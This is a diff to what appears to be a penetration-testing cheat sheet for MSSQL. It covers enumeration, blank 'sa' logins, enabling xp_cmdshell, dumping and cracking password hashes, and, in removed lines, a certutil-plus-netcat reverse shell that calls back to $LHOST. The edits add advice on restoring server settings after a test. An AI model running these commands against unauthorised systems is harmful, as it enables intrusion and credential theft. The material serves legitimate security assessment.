@@ -11,7 +11,7 @@
 ## Enumeration
 
 ```bash
-nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config $IP
+nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info $IP
 ```
 
 ---
@@ -20,7 +20,7 @@ nmap -p 1433 --script ms-sql-info,ms-sql-ntlm-info,ms-sql-config $IP
 
 ```bash
 impacket-mssqlclient sa:@$IP
-impacket-mssqlclient '$NETBIOS/username':'password'@$IP -windows-auth
+impacket-mssqlclient -windows-auth "$NETBIOS/$USERNAME:$PASSWORD@$IP"
 ```
 
 ---
@@ -42,15 +42,16 @@ EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
 EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
 ```
 
+Enabling `xp_cmdshell` requires `sysadmin`, changes server configuration, and is logged. Record whether it was already enabled; if the test enabled it, restore the original state afterward.
+
 Execute commands:
 ```sql
 EXEC xp_cmdshell 'whoami';
 ```
 
-Reverse shell via certutil + nc:
+Disable it after validation only when it was disabled before the test:
 ```sql
-EXEC xp_cmdshell 'certutil -urlcache -f http://$LHOST:8000/nc.exe C:\users\public\nc.exe';
-EXEC xp_cmdshell 'C:\users\public\nc.exe $LHOST 9001 -e cmd.exe';
+EXEC sp_configure 'xp_cmdshell', 0; RECONFIGURE;
 ```
 
 ---
@@ -81,6 +82,8 @@ SELECT name, password_hash FROM sys.sql_logins;
 hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 
+Mode `1731` applies to SQL Server 2012–2022 verifier version `0x02`. Older SQL Server hashes use different modes, and SQL Server 2025 introduces verifier version `0x03`; identify the hash format before cracking.
+
 ---
 
 ## Quick SQL Reference
@@ -89,7 +92,5 @@ hashcat -m 1731 hashes.txt /usr/share/wordlists/rockyou.txt
 SELECT name FROM master..sysdatabases;                              -- list databases
 USE database_name; SELECT name FROM sysobjects WHERE xtype='U';    -- list tables
 SELECT * FROM table_name;                                           -- dump table
+SELECT name, data_source, is_linked FROM sys.servers;               -- linked servers
 ```
-
-!!! tip "Real-world"
-    SA with a blank password is more common than it should be, especially on developer workstations and legacy installations. On internal assessments, also check for linked servers (`SELECT * FROM sys.servers`), a low-privilege MSSQL instance linked to a high-privilege one is a common lateral movement path.
